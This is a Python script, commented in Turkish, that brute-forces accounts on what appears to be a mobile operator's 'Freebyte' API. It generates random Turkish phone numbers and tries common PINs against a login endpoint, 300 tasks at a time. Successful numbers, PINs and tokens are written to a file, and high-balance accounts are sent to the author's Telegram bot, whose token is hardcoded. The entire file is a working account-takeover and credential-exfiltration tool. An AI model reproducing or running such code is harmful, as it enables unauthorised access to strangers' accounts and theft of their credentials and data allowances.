import subprocess
import sys
import asyncio
import aiohttp
import random
import json
import time



import requests
import telebot

# ------------------ Telegram ayarları ------------------
TOKEN = "7472148259:AAG6qOzhEdnXXHbjz2-5t9WAgx8coXcZZEs"  # Bot tokenını buraya koy
CHAT_ID = "7927763999"  # Senin ID'n
bot = telebot.TeleBot(TOKEN)


def freebytebak(token, msisdn, pin):
    url = "https://utxk52xqxk.execute-api.eu-west-1.amazonaws.com/beta/balances"
    headers = {
        'User-Agent': "Mozilla/5.0",
        'Accept': "application/json, text/plain, */*",
        'authorization': "Bearer "+token
    }
    response = requests.get(url, headers=headers).json()
    frebyte = response.get("amount", 0)
    print(f"Freebyte: {frebyte}")
    
    # 5000 ve üzeri ise Telegram'dan gönder
    if frebyte >= 5000:
        mesaj = f"⚡ Freebyte Yüksek!\nTelefon: {msisdn}\nPIN: {pin}\nFreebyte: {frebyte}"
        bot.send_message(CHAT_ID, mesaj)

# ------------------ Async PIN Deneme ------------------
url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/pin/verify"
headers = {
    'User-Agent': "Mozilla/5.0",
    'Accept': "application/json, text/plain, */*",
    'Content-Type': "application/json"
}

common_pins = ['0000', '1234', '1905', '1907', '2023', '1122', '1212', '2580', '1111', '6969', '0007']

def generate_phone_number():
    start = random.choice(['501','505','532','533','534','535','536','537','538','539','542','543','544','545','546','555'])
    rest = ''.join(random.choices("0123456789", k=7))
    return "90"+start+rest

async def try_pin(session, msisdn, pin):
    payload = {"msisdn": msisdn, "pin": pin, "osType": "UNKNOWN"}
    try:
        async with session.post(url, headers=headers, data=json.dumps(payload)) as resp:
            return await resp.json()
    except Exception as e:
        print(f"Hata: {e}")
        return None

async def try_number(session):
    while True:
        msisdn = generate_phone_number()
        for pin in common_pins:
            response = await try_pin(session, msisdn, pin)
            if not response:
                break
            if response.get("token"):
                print(f"[+] Giriş başarılı! {msisdn} | PIN: {pin}")
                res = str(response)
                with open("1gbbaşarili3.txt","a") as h:
                    h.write(f"Giriş başarılı! {msisdn} | PIN: {pin}\n{res}\n\n\n")
                    tok = response["token"]
                    freebytebak(tok, msisdn, pin)
                break
            code = response.get("code", "")
            if code == "wrong_pin":
                print(f"[!] {msisdn} için hesap var ama PIN yanlış ({pin})")
            elif code == "pin_not_set":
                break
            elif code == "too_many_requests":
                print(f"[!] {msisdn} ban yemiş, başka numaraya geçiliyor")
                break
            else:
                print(f"[?] Bilinmeyen yanıt: {response}")
        

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [asyncio.create_task(try_number(session)) for _ in range(300)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
